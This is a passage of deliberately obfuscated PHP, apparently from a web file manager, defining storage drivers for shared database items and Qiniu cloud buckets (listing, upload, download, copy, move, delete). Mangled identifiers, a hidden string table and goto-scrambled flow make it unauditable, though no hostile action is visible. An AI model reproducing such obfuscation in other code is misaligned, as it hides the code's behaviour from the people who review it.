$e§Æ…–Ë¡Š = $this->infoSimple($e™…×Ÿ“çØ); return $e§Æ…–Ë¡Š && $e§Æ…–Ë¡Š[$bè®òïôš[397]] == $bè®òïôš[86] ? !0 : !1; } public function listPath($Fï‚ñİƒâØ, $dÁÒ‚õâŸ = false) { $Cì£ôñíë– =& $_SERVER[…ë˜õ]; if ($Fï‚ñİƒâØ == $Cì£ôñíë–[33]) { return !1; } $bíŠ Ï®çá = array($Cì£ôñíë–[389] => $Fï‚ñİƒâØ); if ($dÁÒ‚õâŸ) { return $this->model->listSource($bíŠ Ï®çá, -1); } return $this->model->listSource($bíŠ Ï®çá); } public function has($bˆÏµÜ¸å¨, $e‚¼ï†‚¢» = false, $aÆŠ¶é‰Ÿä = null) { $dÀ¤ö“Ù‚— =& $_SERVER[…ë˜õ]; $E•ëæíË“ = $this->infoWithChildren($bˆÏµÜ¸å¨); if ($e‚¼ï†‚¢») { return array($dÀ¤ö“Ù‚—[202] => $E•ëæíË“[$dÀ¤ö“Ù‚—[202]], $dÀ¤ö“Ù‚—[201] => $E•ëæíË“[$dÀ¤ö“Ù‚—[201]]); } return $aÆŠ¶é‰Ÿä ? $E•ëæíË“[$dÀ¤ö“Ù‚—[202]] : $E•ëæíË“[$dÀ¤ö“Ù‚—[201]]; } public function listAll($d½ß¸ºÆÙ) { $eª¼ËÇÛñÌ = IO::info($this->pathParse[$_SERVER[…ë˜õ][75]]); if (!$eª¼ËÇÛñÌ) { return array(); } return $this->model->listAll($d½ß¸ºÆÙ); } public function getContent($e¬ŠáóÏ«ö) { return $this->model->getContent($e¬ŠáóÏ«ö); } public function setContent($E‚¥×’¿ÈÄ, $d®¹ì±‰¥Š = '') { return $this->model->setContent($E‚¥×’¿ÈÄ, $d®¹ì±‰¥Š); } public function fileSubstr($BÜë…šÉ°Î, $añ½Îô·Ã¼, $FÉÓ§Ø×ç) { return $this->model->fileSubstr($BÜë…šÉ°Î, $añ½Îô·Ã¼, $FÉÓ§Ø×ç); } public function download($BÓ© ½°, $bšß³ÆÜ = '') { $D÷†×ªã = get_path_father($bšß³ÆÜ); $FœŒÕ¯…— = get_path_this($bšß³ÆÜ); $dÔÇìóÊ‰¹ = $this->model->fileInfoGet($BÓ© ½°); $d×ËÀâÕ° = IO::copy($dÔÇìóÊ‰¹[$_SERVER[…ë˜õ][75]], $D÷†×ªã, !1, $FœŒÕ¯…—); return $d×ËÀâÕ°; } public function setModifyTime($AÆ˜å¢É‰ğ, $B°Ø¤ˆ£¿ = '') { $this->model->metaSet($AÆ˜å¢É‰ğ, $_SERVER[…ë˜õ][1211], $B°Ø¤ˆ£¿); } public function upload($CÓÉİ×æù‘, $B¸Ê‹©»×, $E’¬‡‚àÏ = false, $bÊ©æ–¯ = REPEAT_REPLACE) { $Aä–ÜÖé³’ =& $_SERVER[…ë˜õ]; $B³ÃÔÄÑ“Ó = $this->parse($CÓÉİ×æù‘); $A‚éÚ…¢«Ê = $this->model->addFile($B³ÃÔÄÑ“Ó[$Aä–ÜÖé³’[388]], $B¸Ê‹©»×, $B³ÃÔÄÑ“Ó[$Aä–ÜÖé³’[75]], $E’¬‡‚àÏ, $bÊ©æ–¯); return $this->getPathOuter($A‚éÚ…¢«Ê); } public function uploadFileByID($a¹êñùôÒ¬, $EÏğÉ·ƒéÏ, $c†Îñ²±ƒ—) { $bµ×Ë“²ÇÏ =& $_SERVER[…ë˜õ]; $B÷¤½¦ÍŸØ = $this->parse($a¹êñùôÒ¬); $bÜøÉÓ‡²ë = $this->model->addFileByFileID($B÷¤½¦ÍŸØ[$bµ×Ë“²ÇÏ[388]], $EÏğÉ·ƒéÏ, $B÷¤½¦ÍŸØ[$bµ×Ë“²ÇÏ[75]], $c†Îñ²±ƒ—); return $this->getPathOuter($bÜøÉÓ‡²ë); } public function addFileByRemote($bÉÎÇøŒŠ, $fí¦Å¶ÄÑæ, $FâªÄá–Éî = array(), $AÕ ®£ã = '', $b÷Œ™™‰†‚) { $f îÅàîĞ« =& $_SERVER[…ë˜õ]; $FÎ„¼å«¦» = $this->parse($bÉÎÇøŒŠ); $AÕ ®£ã = empty($AÕ ®£ã) ? $FÎ„¼å«¦»[$f îÅàîĞ«[75]] : $AÕ ®£ã; $còßšÆ©„‹ = $this->model->addFileByRemote($FÎ„¼å«¦»[$f îÅàîĞ«[388]], $fí¦Å¶ÄÑæ, $AÕ ®£ã, $FâªÄá–Éî, $b÷Œ™™‰†‚); return $this->getPathOuter($còßšÆ©„‹); } public function uploadLink($eœ‡ªøÀŸ‚, $D¸¹ÎÀÄ˜» = 0) { $B»¸òÁ»¿§ =& $_SERVER[…ë˜õ]; $CÉÊó–»¢ = $this->parse($eœ‡ªøÀŸ‚); $dˆ‰Ò…¼ = _get($GLOBALS[$B»¸òÁ»¿§[7]], $B»¸òÁ»¿§[1212]); $Cø·ÕÇ›¢Ã = _get($GLOBALS[$B»¸òÁ»¿§[7]], $B»¸òÁ»¿§[1213]); $eœ‡ªøÀŸ‚ = Model($B»¸òÁ»¿§[566])->createFileName($CÉÊó–»¢[$B»¸òÁ»¿§[75]], $dˆ‰Ò…¼, $Cø·ÕÇ›¢Ã); return IO::uploadLink($eœ‡ªøÀŸ‚, $D¸¹ÎÀÄ˜»); } public function fileNameAuto($a×¨‘Œ¹ä, $A®¿Ú«¤á, $f»È÷ø•‰’ = REPEAT_REPLACE, $a»¹¸ÀÑ¾ = false) { return $this->model->fileNameAuto($a×¨‘Œ¹ä, $A®¿Ú«¤á, $f»È÷ø•‰’, $a»¹¸ÀÑ¾); } public function fileNameExist($FÙºîÏ¶ÕŠ, $F¼¡Ù»¬›’) { return $this->model->fileNameExist($FÙºîÏ¶ÕŠ, $F¼¡Ù»¬›’); } protected function _fileOut($A£æõ¶Ï¬Ù, $fŞê–¼ÕÎ’ = false, $fÒÆÍº‰ø¥ = false, $c·ÈéŸ…âá = '', $eÅß¥‹¯”Ø = false) { goto AŞ±ŠÃ„Ú; eİ¼ÜÚ¥ÈÕ: $E”—¶áÍ² = $this->model->fileInfoGet($A£æõ¶Ï¬Ù); $c·ÈéŸ…âá = $E”—¶áÍ²[$aâĞ†™ê£“[169]] ? $E”—¶áÍ²[$aâĞ†™ê£“[169]] : $c·ÈéŸ…âá; $f³ää…ïëô = isset($GLOBALS[$aâĞ†™ê£“[1215]]) ? $GLOBALS[$aâĞ†™ê£“[1215]] : $f«¥ËÕÒ‹[$aâĞ†™ê£“[28]]; goto DÊõ© åºŒ; AŞ±ŠÃ„Ú: $aâĞ†™ê£“ =& $_SERVER[…ë˜õ]; $f«¥ËÕÒ‹ = $this->model->sourceInfo($A£æõ¶Ï¬Ù); if ($f«¥ËÕÒ‹[$aâĞ†™ê£“[397]] == $aâĞ†™ê£“[86]) { header($aâĞ†™ê£“[1214]); die; } goto eİ¼ÜÚ¥ÈÕ; DÊõ© åºŒ: if ($eÅß¥‹¯”Ø) { return IO::fileOutServer($E”—¶áÍ²[$aâĞ†™ê£“[75]], $fŞê–¼ÕÎ’, $f³ää…ïëô, $c·ÈéŸ…âá); } IO::fileOut($E”—¶áÍ²[$aâĞ†™ê£“[75]], $fŞê–¼ÕÎ’, $f³ää…ïëô, $c·ÈéŸ…âá); goto aÌ®Íš’Æ; aÌ®Íš’Æ: } public function fileOut($DÊ²Äğù…“, $AÃ‘É‹¤¬… = false, $d‹†×•çì¿ = false, $F„¬Òö®œ« = '') { $this->_fileOut($DÊ²Äğù…“, $AÃ‘É‹¤¬…, $d‹†×•çì¿, $F„¬Òö®œ«); } public function fileOutServer($Aë¿Á Ò†, $dô†—Ú = false, $Aí·Æ²¦ƒ‰ = false, $DÌòè”Ä„ = '') { $this->_fileOut($Aë¿Á Ò†, $dô†—Ú, $Aí·Æ²¦ƒ‰, $DÌòè”Ä„, !0); } protected function _fileOutImage($A†‚İ¡¦¡è, $bŞ·åù¾°™ = 250) { goto A¦ì¦“Ô‡÷; b‡èñ¯İº: $GLOBALS[$CöÀÆ†„ã[1215]] = $E³¨ôé¹õÚ[$CöÀÆ†„ã[28]]; $GLOBALS[$CöÀÆ†„ã[161]] = $E³¨ôé¹õÚ; IO::fileOutImage($E³¨ôé¹õÚ[$CöÀÆ†„ã[75]], $bŞ·åù¾°™); goto c¨†ëŠ½ºœ; A¦ì¦“Ô‡÷: $CöÀÆ†„ã =& $_SERVER[…ë˜õ]; $E¹íÖº×ÅØ = $this->model->pathInfo($A†‚İ¡¦¡è); if ($E¹íÖº×ÅØ[$CöÀÆ†„ã[397]] == $CöÀÆ†„ã[86]) { show_json($CöÀÆ†„ã[1216] . $A†‚İ¡¦¡è, !1); } goto bùğ„ÌÓÔ; bùğ„ÌÓÔ: $E³¨ôé¹õÚ = $this->model->fileInfoGet($A†‚İ¡¦¡è); $E³¨ôé¹õÚ[$CöÀÆ†„ã[28]] = $E¹íÖº×ÅØ[$CöÀÆ†„ã[28]]; $E³¨ôé¹õÚ[$CöÀÆ†„ã[162]] = $E¹íÖº×ÅØ[$CöÀÆ†„ã[162]]; goto b‡èñ¯İº; c¨†ëŠ½ºœ: } public function fileOutImage($B¢³Â´è¢, $eŒÒÀ¿ä‘… = 250) { $this->_fileOutImage($B¢³Â´è¢, $eŒÒÀ¿ä‘…); } public function fileOutImageServer($fÈÏÉÃÌâˆ, $CÖ¹öˆõè– = 250) { $this->_fileOutImage($fÈÏÉÃÌâˆ, $CÖ¹öˆõè–); } public function link($f¡ŞÚ±­, $eœÍÌ…Ğ¿ = '') { $b»ƒÔ¡ê´ç = $this->model->fileInfoGet($f¡ŞÚ±­); return IO::link($b»ƒÔ¡ê´ç[$_SERVER[…ë˜õ][75]], $eœÍÌ…Ğ¿); } protected function parse($BèÆŞ‹Ş×È) { $FíÔ·Ïœ¿ =& $_SERVER[…ë˜õ]; if (strstr($BèÆŞ‹Ş×È, $FíÔ·Ïœ¿[8]) === !1) { return array($FíÔ·Ïœ¿[406] => intval($BèÆŞ‹Ş×È), $FíÔ·Ïœ¿[75] => $FíÔ·Ïœ¿[33], $FíÔ·Ïœ¿[1210] => array()); } $A¿ˆÇŸ¢Á = explode($FíÔ·Ïœ¿[8], trim($BèÆŞ‹Ş×È, $FíÔ·Ïœ¿[8])); if (count($A¿ˆÇŸ¢Á) < 2) { show_tips($BèÆŞ‹Ş×È . $FíÔ·Ïœ¿[1217]); } return array($FíÔ·Ïœ¿[406] => intval($A¿ˆÇŸ¢Á[0]), $FíÔ·Ïœ¿[75] => $A¿ˆÇŸ¢Á[1], $FíÔ·Ïœ¿[1210] => array_slice($A¿ˆÇŸ¢Á, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($B’ñ¶š»Óç) { $this->pathParse = $B’ñ¶š»Óç; $this->model = Model($_SERVER[…ë˜õ][1209]); } public function getPathOuter($cºèÌ•îë) { $A“´¹ŠÆ†™ =& $_SERVER[…ë˜õ]; if (!$cºèÌ•îë) { return $cºèÌ•îë; } $dëö›‹µ„¸ = $this->parse($cºèÌ•îë); return trim(KodIO::makeShare($this->pathParse[$A“´¹ŠÆ†™[388]], $dëö›‹µ„¸[$A“´¹ŠÆ†™[388]]), $A“´¹ŠÆ†™[8]); } protected function infoParse($CÅ‡ŠàÛ°·, $dÀÍ„ÆêÆÛ = false, $Cô‚–ØÉ·§ = false) { $f‰¦ÉÍë‘ =& $_SERVER[…ë˜õ]; $D†ñ±Ô™èõ = $this->pathParse[$f‰¦ÉÍë‘[388]]; $eãŒ‰ÕœÒ = trim($this->pathParse[$f‰¦ÉÍë‘[1069]], $f‰¦ÉÍë‘[8]); return Action($f‰¦ÉÍë‘[1218])->sharePathInfo($D†ñ±Ô™èõ, $eãŒ‰ÕœÒ); } public function infoFull($bÁ¶Ÿ’ˆåĞ) { $Dè´íñáÜ§ =& $_SERVER[…ë˜õ]; $C¸“º«Ø›ˆ = explode($Dè´íñáÜ§[8], trim($bÁ¶Ÿ’ˆåĞ, $Dè´íñáÜ§[8])); if (count($C¸“º«Ø›ˆ) > 1) { $e«ãÜ¦„Üâ = implode($Dè´íñáÜ§[8], array_splice($C¸“º«Ø›ˆ, 1)); $c—•ëâ«ÁÍ = $this->model->pathInfoByPath($C¸“º«Ø›ˆ[0], $e«ãÜ¦„Üâ); if (!$c—•ëâ«ÁÍ) { return !1; } $this->pathParse[$Dè´íñáÜ§[1069]] = $c—•ëâ«ÁÍ[$Dè´íñáÜ§[390]]; } return $this->infoParse($bÁ¶Ÿ’ˆåĞ); } public function listAll($AÎõ¿‡«éù) { goto AÏùÒé«ª; AÏùÒé«ª: $A„÷¢ó‹ä =& $_SERVER[…ë˜õ]; $B¡Ô®ÂÍ¥¿ = IO::info($this->pathParse[$A„÷¢ó‹ä[75]]); if (!$B¡Ô®ÂÍ¥¿) { return array(); } goto cšª²ãã—; cšª²ãã—: $b¤£Š…Óí = $this->model->listAll($AÎõ¿‡«éù); $EŸÜÅ¨ôÀâ = Model($A„÷¢ó‹ä[558])->getInfo($B¡Ô®ÂÍ¥¿[$A„÷¢ó‹ä[462]]); $fÑó‘°«»Ÿ = Action($A„÷¢ó‹ä[1218]); goto Fè Šò¸îƒ; Fè Šò¸îƒ: foreach ($b¤£Š…Óí as &$Eè³–ã¿—¢) { check_abort(); $Eè³–ã¿—¢[$A„÷¢ó‹ä[84]] = $fÑó‘°«»Ÿ->_shareItemeParse($Eè³–ã¿—¢[$A„÷¢ó‹ä[84]], $EŸÜÅ¨ôÀâ); } unset($Eè³–ã¿—¢); return $b¤£Š…Óí; goto Eò·İ‚Üè; Eò·İ‚Üè: } } goto a†œ¬Ö™º; cØåÏç­ñ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($bİìØš»µÌ) { parent::__construct(); require_once SDK_DIR . $_SERVER[…ë˜õ][1306]; $this->_init($bİìØš»µÌ); } public function _init($fÓÊ†„¯) { goto eÊ¢—ˆ•—î; eÊ¢—ˆ•—î: $B»ª˜õÓÁ =& $_SERVER[…ë˜õ]; foreach ($fÓÊ†„¯ as $aŒš„¶œ => $fÍ»Š¯“¤à) { if (isset($this->{$aŒš„¶œ})) { $this->{$aŒš„¶œ} = $fÍ»Š¯“¤à; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($B»ª˜õÓÁ[1307] . LNG($B»ª˜õÓÁ[1266])); } goto dÛã†âô´; dÛã†âô´: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto A¦‹ŒŠ»¤È; A¦‹ŒŠ»¤È: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto cìØÜ±œ°„; cìØÜ±œ°„: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($f¾ñŠª£’‰, $EŒÌ…¢õºØ = '', $d†¯ÃğÖå = REPEAT_RENAME) { if ($this->setContent($f¾ñŠª£’‰, $EŒÌ…¢õºØ)) { return $this->getPathOuter($f¾ñŠª£’‰); } return !1; } public function mkdir($DˆØóõï®Ÿ, $C‡¾’¸›¥Ç = REPEAT_SKIP) { goto E˜šÆ‡ç­; BÈõ™ß©Œ: if (!$this->mkfile($d—’…Ûâ…ê)) { return !1; } if (!$this->moveFile($d—’…Ûâ…ê, $DˆØóõï®Ÿ)) { $this->delFile($d—’…Ûâ…ê); return !1; } return $this->getPathOuter($e£ÑÀŠ„˜); goto eÅòÜ¦˜˜«; F³§ÑÖ¡Î³: $DˆØóõï®Ÿ = $e£ÑÀŠ„˜ . $AÕŸ®ˆ–¡[8]; $FØ¨ï…­èÖ = get_path_this($e£ÑÀŠ„˜); $d—’…Ûâ…ê = $DˆØóõï®Ÿ . $FØ¨ï…­èÖ; goto BÈõ™ß©Œ; E˜šÆ‡ç­: $AÕŸ®ˆ–¡ =& $_SERVER[…ë˜õ]; $e£ÑÀŠ„˜ = trim($DˆØóõï®Ÿ, $AÕŸ®ˆ–¡[8]); if ($this->_isFolder($e£ÑÀŠ„˜)) { return $this->getPathOuter($e£ÑÀŠ„˜); } goto F³§ÑÖ¡Î³; eÅòÜ¦˜˜«: } public function copyFile($E†¬ñ„¹®¾, $f£‚ù¶æœ) { $cø‚ø¼‰™­ = $this->bucketManager->copy($this->bucket, $E†¬ñ„¹®¾, $this->bucket, $f£‚ù¶æœ, !0); return $cø‚ø¼‰™­ ? !1 : $this->getPathOuter($f£‚ù¶æœ); } public function moveFile($a„õ›„ØÑ„, $fŠáàªç—‡) { $EÁİÇË‰Í• = $this->bucketManager->move($this->bucket, $a„õ›„ØÑ„, $this->bucket, $fŠáàªç—‡, !0); return $EÁİÇË‰Í• ? !1 : $this->getPathOuter($fŠáàªç—‡); } public function delFile($e¤–Ü¯ñ¹) { if (!$this->exist($e¤–Ü¯ñ¹)) { return !0; } $DÑ²Èâ²Õñ = $this->bucketManager->delete($this->bucket, $e¤–Ü¯ñ¹); return $DÑ²Èâ²Õñ ? !1 : !0; } public function delFolder($EÜŒ»ïæëÌ) { goto EˆŸ“½Ìœß; böãİ•âÅó: if (!empty($EÜŒ»ïæëÌ) && !in_array($Eï¢¹‘òŠ, $CÌ“¸ëâ¯³[$C’®Æù‘”[74]])) { $CÌ“¸ëâ¯³[$C’®Æù‘”[74]][] = $Eï¢¹‘òŠ; } $bƒù•¾Á´ = $this->delByBatch($CÌ“¸ëâ¯³[$C’®Æù‘”[73]]); if (!$bƒù•¾Á´) { return !1; } goto C¼à¥Ë±Éœ; C¼à¥Ë±Éœ: return $this->delByBatch($CÌ“¸ëâ¯³[$C’®Æù‘”[74]]); goto B£²ùê‰š; DÄÇºğÕ‹’: $CÌ“¸ëâ¯³ = $this->fileList($EÜŒ»ïæëÌ); $this->listItemCache = !0; $Eï¢¹‘òŠ = trim($EÜŒ»ïæëÌ, $C’®Æù‘”[8]) . $C’®Æù‘”[8]; goto böãİ•âÅó; EˆŸ“½Ìœß: $C’®Æù‘” =& $_SERVER[…ë˜õ]; if (!$this->exist($EÜŒ»ïæëÌ)) { return !0; } $this->listItemCache = !1; goto DÄÇºğÕ‹’; B£²ùê‰š: } private function delByBatch($e‡Ï·’™«) { foreach (array_chunk($e‡Ï·’™«, 1000) as $e‡ùÛçÙé) { $f ˜åòÇù = $this->bucketManager->buildBatchDelete($this->bucket, $e‡ùÛçÙé); list($d‡Ùµ¬Ù‹°, $f¹á¬Ïõá) = $this->bucketManager->batch($f ˜åòÇù); if ($f¹á¬Ïõá) { return !1; } } return !0; } public function rename($E¨ÌÔÇöô, $eç’œÏóå³) { return $this->renameObject($E¨ÌÔÇöô, $eç’œÏóå³); } public function fileInfo($a£ä‹øŒµ˜, $A×ØÙçšÒ = false, $d­Ş§È•½ = array()) { goto C×ô’è‘ºĞ; AØÓ‰Ù†ç: $aö Š²£İ‘[$Fª°ç‚‰ŠÜ[192]] = $aö Š²£İ‘[$Fª°ç‚‰ŠÜ[83]] = 0; $aö Š²£İ‘[$Fª°ç‚‰ŠÜ[193]] = $aö Š²£İ‘[$Fª°ç‚‰ŠÜ[194]] = !0; if (empty($d­Ş§È•½)) { $d­Ş§È•½ = $this->objectMeta($a£ä‹øŒµ˜); if (!$d­Ş§È•½) { return $aö Š²£İ‘; } } goto C‘¦õæ†Ö; C‘¦õæ†Ö: if (isset($d­Ş§È•½[$Fª°ç‚‰ŠÜ[1309]])) { $aö Š²£İ‘[$Fª°ç‚‰ŠÜ[83]] = substr($d­Ş§È•½[$Fª°ç‚‰ŠÜ[1309]] . $Fª°ç‚‰ŠÜ[33], 0, 10); } if (isset($d­Ş§È•½[$Fª°ç‚‰ŠÜ[1308]])) { $aö Š²£İ‘[$Fª°ç‚‰ŠÜ[77]] = $d­Ş§È•½[$Fª°ç‚‰ŠÜ[1308]]; } return $aö Š²£İ‘; goto cßËÂÚŠšÄ; C×ô’è‘ºĞ: $Fª°ç‚‰ŠÜ =& $_SERVER[…ë˜õ]; $aö Š²£İ‘ = array($Fª°ç‚‰ŠÜ[28] => $this->pathThis($a£ä‹øŒµ˜), $Fª°ç‚‰ŠÜ[75] => $this->getPathOuter($Fª°ç‚‰ŠÜ[8] . $a£ä‹øŒµ˜), $Fª°ç‚‰ŠÜ[29] => $Fª°ç‚‰ŠÜ[191], $Fª°ç‚‰ŠÜ[77] => isset($d­Ş§È•½[$Fª°ç‚‰ŠÜ[1308]]) ? $d­Ş§È•½[$Fª°ç‚‰ŠÜ[1308]] : 0, $Fª°ç‚‰ŠÜ[167] => $this->ext($a£ä‹øŒµ˜)); if ($A×ØÙçšÒ) { return $aö Š²£İ‘; } goto AØÓ‰Ù†ç; cßËÂÚŠšÄ: } public function folderInfo($BÑÉÌ‚··, $CÙ£ØÔˆôç = false) { goto AŸÀ–Š•Õá; e¦Å¹‹Îø¸: $dÜâìÇÂ‚Ë = $this->objectMeta($BÑÉÌ‚··); if (isset($dÜâìÇÂ‚Ë[$BµĞÇ‚¢¨ƒ[1309]])) { $d…‹œâ”½à[$BµĞÇ‚¢¨ƒ[83]] = substr($dÜâìÇÂ‚Ë[$BµĞÇ‚¢¨ƒ[1309]] . $BµĞÇ‚¢¨ƒ[33], 0, 10); } return $d…‹œâ”½à; goto cù©ƒÒŞ¶„; fƒ¤Ä¤¡”ò: $d…‹œâ”½à[$BµĞÇ‚¢¨ƒ[192]] = $d…‹œâ”½à[$BµĞÇ‚¢¨ƒ[83]] = 0; $d…‹œâ”½à[$BµĞÇ‚¢¨ƒ[193]] = $d…‹œâ”½à[$BµĞÇ‚¢¨ƒ[194]] = !0; $BÑÉÌ‚·· = rtrim($BÑÉÌ‚··, $BµĞÇ‚¢¨ƒ[8]) . $BµĞÇ‚¢¨ƒ[8]; goto e¦Å¹‹Îø¸; AŸÀ–Š•Õá: $BµĞÇ‚¢¨ƒ =& $_SERVER[…ë˜õ]; $d…‹œâ”½à = array($BµĞÇ‚¢¨ƒ[28] => $this->pathThis($BÑÉÌ‚··), $BµĞÇ‚¢¨ƒ[75] => $this->getPathOuter($BµĞÇ‚¢¨ƒ[8] . $BÑÉÌ‚··), $BµĞÇ‚¢¨ƒ[29] => $BµĞÇ‚¢¨ƒ[76]); if ($CÙ£ØÔˆôç) { return $d…‹œâ”½à; } goto fƒ¤Ä¤¡”ò; cù©ƒÒŞ¶„: } public function listPath($cÒİÑæŠğƒ, $FÑáÕàèÁ = false) { $Dö˜Ğì„Û· =& $_SERVER[…ë˜õ]; $Fœ¢Ù¸³ = $this->fileList($cÒİÑæŠğƒ, $Dö˜Ğì„Û·[8], !0); foreach ($Fœ¢Ù¸³[$Dö˜Ğì„Û·[74]] as $a±¬Ë˜¸É => $còÖ›‹¶Î›) { $Fœ¢Ù¸³[$Dö˜Ğì„Û·[74]][$a±¬Ë˜¸É] = $this->folderInfo($còÖ›‹¶Î›, $FÑáÕàèÁ); } foreach ($Fœ¢Ù¸³[$Dö˜Ğì„Û·[73]] as $a±¬Ë˜¸É => $còÖ›‹¶Î›) { $Fœ¢Ù¸³[$Dö˜Ğì„Û·[73]][$a±¬Ë˜¸É] = $this->fileInfo($còÖ›‹¶Î›[$Dö˜Ğì„Û·[92]], $FÑáÕàèÁ, $còÖ›‹¶Î›); } return $Fœ¢Ù¸³; } public function has($A½ù‡£ª®Û, $b‡ÚèÇ¤Úø = false, $A¿—ŒÑÏ = true) { goto F‹Áê‰«ç˜; F‹Áê‰«ç˜: $CÛ‰Ø“½ˆ =& $_SERVER[…ë˜õ]; $A½ù‡£ª®Û = trim($A½ù‡£ª®Û, $CÛ‰Ø“½ˆ[8]); $D“áÅ¼íÅ¤ = empty($A½ù‡£ª®Û) ? $CÛ‰Ø“½ˆ[33] : $A½ù‡£ª®Û . $CÛ‰Ø“½ˆ[8]; goto Aù—ç–âï; EÈ™ºóÅŸ¢: $F¶‰ß‹ºÑ« = $Eğí³‹„‡½ = 0; while (!0) { check_abort(); list($c¼÷¼Âõœï, $Ağ¹Ï„§Ìç) = $this->bucketManager->listFiles($this->bucket, $D“áÅ¼íÅ¤, $b¦è¤‰«·Ğ, $c°É†„‡–¸, $f¤÷ ­»ĞÓ); if ($Ağ¹Ï„§Ìç) { break; } $b¦è¤‰«·Ğ = array_key_exists($CÛ‰Ø“½ˆ[1278], $c¼÷¼Âõœï) ? $b¦è¤‰«·Ğ = $c¼÷¼Âõœï[$CÛ‰Ø“½ˆ[1310]] : $CÛ‰Ø“½ˆ[33]; if ($b‡ÚèÇ¤Úø) { if (!empty($c¼÷¼Âõœï[$CÛ‰Ø“½ˆ[1311]])) { $F¶‰ß‹ºÑ« += count($c¼÷¼Âõœï[$CÛ‰Ø“½ˆ[1311]]); } if (!empty($c¼÷¼Âõœï[$CÛ‰Ø“½ˆ[1312]])) { $Eğí³‹„‡½ += count($c¼÷¼Âõœï[$CÛ‰Ø“½ˆ[1312]]); } if ($b¦è¤‰«·Ğ === $CÛ‰Ø“½ˆ[33]) { break; } continue; } if ($A¿—ŒÑÏ) { if (!empty($c¼÷¼Âõœï[$CÛ‰Ø“½ˆ[1311]])) { return !0; } } else { if (!empty($c¼÷¼Âõœï[$CÛ‰Ø“½ˆ[1312]])) { return !0; } } if ($b¦è¤‰«·Ğ === $CÛ‰Ø“½ˆ[33]) { break; } } if ($b‡ÚèÇ¤Úø) { return array($CÛ‰Ø“½ˆ[201] => $F¶‰ß‹ºÑ«, $CÛ‰Ø“½ˆ[202] => $Eğí³‹„‡½); } goto a—­¸ÀÔ–¹; a—­¸ÀÔ–¹: return !1; goto eĞÕ»ÏÁ¬Ğ; Aù—ç–âï: $b¦è¤‰«·Ğ = $CÛ‰Ø“½ˆ[33]; $c°É†„‡–¸ = 500; $f¤÷ ­»ĞÓ = $CÛ‰Ø“½ˆ[8]; goto EÈ™ºóÅŸ¢; eĞÕ»ÏÁ¬Ğ: } public function listAll($b¶åä—‚œÒ) { $EéÊïğ­ŸÈ =& $_SERVER[…ë˜õ]; $bº©‘‹çÆÚ = $this->fileList($b¶åä—‚œÒ, $EéÊïğ­ŸÈ[33], !0); $d§ëÊÁŠÕ» = array(); foreach ($bº©‘‹çÆÚ[$EéÊïğ­ŸÈ[73]] as $AàèÛ¦§®‡) { $d§ëÊÁŠÕ»[$AàèÛ¦§®‡[$EéÊïğ­ŸÈ[92]]] = $AàèÛ¦§®‡[$EéÊïğ­ŸÈ[77]]; } foreach ($bº©‘‹çÆÚ[$EéÊïğ­ŸÈ[74]] as $AàèÛ¦§®‡) { if (is_string($AàèÛ¦§®‡)) { $d§ëÊÁŠÕ»[$AàèÛ¦§®‡] = 0; } } return $this->listAllFiles($b¶åä—‚œÒ, array_keys($d§ëÊÁŠÕ»), $d§ëÊÁŠÕ»); } private function fileList($fà©áë®†ğ, $eïª¢Œ­¹— = '', $E±¼•ßˆ°Â = 0) { goto DøªñÇò…±; aâ†’Î‰”é: return array($b„ŞÓ±§¢[74] => $dùíµæ”†Ì, $b„ŞÓ±§¢[73] => $eíÚ´œ‘Ğ); goto AÎÇ‡˜’‚Ô; Aéª¶Š¼Ş…: $dùíµæ”†Ì = $eíÚ´œ‘Ğ = array(); while (!0) { check_abort(); list($a¦±²ÓÅˆ, $EƒÕß›°ÌÆ) = $this->bucketManager->listFiles($this->bucket, $C‚«†Œí ˜, $AÜÌ’¼‡Ğ¬, $Aš§åöï³´, $eïª¢Œ­¹—); if ($EƒÕß›°ÌÆ) { break; } $AÜÌ’¼‡Ğ¬ = array_key_exists($b„ŞÓ±§¢[1278], $a¦±²ÓÅˆ) ? $AÜÌ’¼‡Ğ¬ = $a¦±²ÓÅˆ[$b„ŞÓ±§¢[1310]] : $b„ŞÓ±§¢[33]; $a¹Š‘ÔÚ©† = isset($a¦±²ÓÅˆ[$b„ŞÓ±§¢[1311]]) ? $a¦±²ÓÅˆ[$b„ŞÓ±§¢[1311]] : array(); $bÙ·²‘É·ß = isset($a¦±²ÓÅˆ[$b„ŞÓ±§¢[1312]]) ? $a¦±²ÓÅˆ[$b„ŞÓ±§¢[1312]] : array(); foreach ($a¹Š‘ÔÚ©† as $E¤Àì«ŠÖ) { goto aŠµá·êƒÅ; c™ÄïÅÍ„: if ($fƒó³»Æ¯ƒ) { $dùíµæ”†Ì[] = $e½Ú®êÎ£; continue; } $eíÚ´œ‘Ğ[] = $E±¼•ßˆ°Â ? $E¤Àì«ŠÖ : $e½Ú®êÎ£; goto c‡‰Ä”½¢; d‘‘ˆÆÈ…‚: $E¤Àì«ŠÖ[$b„ŞÓ±§¢[77]] = $fæÅ³Ê­Ì·; $fƒó³»Æ¯ƒ = $fæÅ³Ê­Ì· == 0 && substr($e½Ú®êÎ£, strlen($e½Ú®êÎ£) - 1, 1) == $b„ŞÓ±§¢[8] ? !0 : !1; if ($b®¦Æƒ‡) { $this->cacheMethod($b„ŞÓ±§¢[197], $e½Ú®êÎ£, $fƒó³»Æ¯ƒ); $this->cacheMethod($b„ŞÓ±§¢[198], $e½Ú®êÎ£, $E¤Àì«ŠÖ); } goto c™ÄïÅÍ„; aŠµá·êƒÅ: if ($E¤Àì«ŠÖ[$b„ŞÓ±§¢[92]] == $C‚«†Œí ˜) { continue; } $e½Ú®êÎ£ = $E¤Àì«ŠÖ[$b„ŞÓ±§¢[92]]; $fæÅ³Ê­Ì· = $E¤Àì«ŠÖ[$b„ŞÓ±§¢[1308]]; goto d‘‘ˆÆÈ…‚; c‡‰Ä”½¢: } foreach ($bÙ·²‘É·ß as $e½Ú®êÎ£) { if ($e½Ú®êÎ£ == $C‚«†Œí ˜) { continue; } 